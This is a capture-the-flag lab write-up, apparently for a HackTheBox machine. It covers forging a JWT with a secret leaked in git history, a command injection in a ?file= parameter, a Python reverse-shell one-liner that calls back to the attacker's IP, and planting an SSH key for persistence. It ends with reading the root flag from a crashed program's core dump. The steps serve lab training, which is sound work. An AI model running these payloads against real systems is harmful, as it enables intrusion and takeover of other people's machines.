IT'S ALL ABOUT READING DOCS.
---
![](https://i.ibb.co/nfFw67L/secret.png)\
\
\
*note that i skipped useless parts like "we can see this, but as we can see, it's not important to us & wrong tries"*\
*note1 that i don't recommend to blindly copy + paste, you will learn nothing. do your own research. :)*

```
POST /api/user/register HTTP/1.1
Content-Type: application/json //important to add
[blabla]

  {
	"name": "hihihi",
	"email": "hihihi@gmail.com",
	"password": "hihihi"
  }
```
`response : {"user": "hihihi"} // user created`
\
\
\
```
POST /api/user/login HTTP/1.1
[BLABLA]
  {
	"email": "hihihi@gmail.com",
	"password": "hihihi"
  }
```
`response : [OUR JWT TOKEN.... ALSO AS auth-token header.]`
\
\
**/download - DOWNLOAD THE SOURCE CODE**

`// important to proceed further, easily discoverable by gobuster, ffuf,.. what do you prefer`

- we can see, that in .env file, there's **theadmin** user.     `// in jwt.io, rename yourself to "theadmin"`
- the secret seems to be **secret**, but it's false. (checking with jwt.io)     `// reading the file + trying it in burp.. token is invalid.`
- as we can see .git, we can try `git log` to see changes.     `// yes`
```
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons // one of the snippets, that is key to us.
```
THE COMMAND FOR TIME TRAVEL BACK IS : `git HEAD~2`.
after that, we can see **TOKEN_SECRET**, with different secret    
\
`// the secret works, trust me... or more like try it.`

```
GET /api/priv 
auth-token: [token with secret]
```
`response : "desc":"welcome back admin"            // confirms it works.`
\
\
\
- with the command `git HEAD~2`, we can also see a snippet of js code : 
```
router.get('/logs', verifytoken, (req, res) => {
+    const file = req.query.file;     // creates ?file param.
+    const userinfo = { name: req.user }
+    const name = userinfo.name.name;
```
- the most interesting for us is `req.query.file`, which creates ?file= param.
\
`?file=index.js;id // command injection`\
`?file=index.js;cat+/home/dasith/user.txt // getting USER FLAG [not gonna leak for you]`

now, we need to get into the server. found this cool blog : https://www.aldeid.com/wiki/Command-injection-to-shell --> it is not working, but interesting method as well. nice to read.


`python3+-c+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[your ip]",[port]));os.dup2(s.fileno(),0);+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import+pty;+pty.spawn("sh")' // classic way ; it works. (done with burp)`

So, we got reverse shell, but let's be honest, reverse shell is shit. as we can see from nmap scan, 22 is open, meaning we can connect via ssh.
\
- let's go into `/home/dasith` directory ;
```
mkdir .ssh
cd .ssh
ssh-keygen -t rsa //spam enter
cat id_rsa.pub > authorized_keys
chmod 600 authorized_keys
chmod 700 id_rsa
cd ..
chmod 700 .ssh
```

- copy the id_rsa into your machine `//cat id_rsa and copy it`
```
ssh -o StrictHostKeyChecking=no -i id_rsa dasith@10.10.11.120 uptime // add our host to verified
ssh -id_rsa dasith@10.10.11.120 //connect 
```
- in `/opt`, there's strange file **count**

`./count`

**note:** here, i was stuck for a long period of time. especially with the `apport-unpack`, which i never heard of.
```
Enter source file/directory name: /root/root.txt // we want to get root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ctrl^Z // background the proccess
```
let's kill it!
```
ps //see PID of the script
kill -SIGSEGV [PID] // kill the proccess
fg // get back from background
Segmentation fault (core dumped) // BroKEn
```
as we can see, we broke it.
crash logs are in `/var/crash/`. there, we can use one cool utility i didn't know = `apport-unpack`

`apport-unpack _opt_count.1000.crash [directory whenever you want] // 1000 is right, others are useless`\
`cd [crashes]`

now, most interesting is CoreDump obviously, since the error was `Segmentation fault (core dumped)`\
`strings CoreDump // find the root flag.`

thanks.

**what i used :** 
\
              https://askubuntu.com/questions/45679/ssh-connection-problem-with-host-key-verification-failed-error {ssh verify host} \
              https://jwt.io/ 
	      \
              https://www.unix.com/man-page/linux/1/apport-unpack/ {checked man page of apport unpack}
              
https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens {for jwt pentesting.}
              
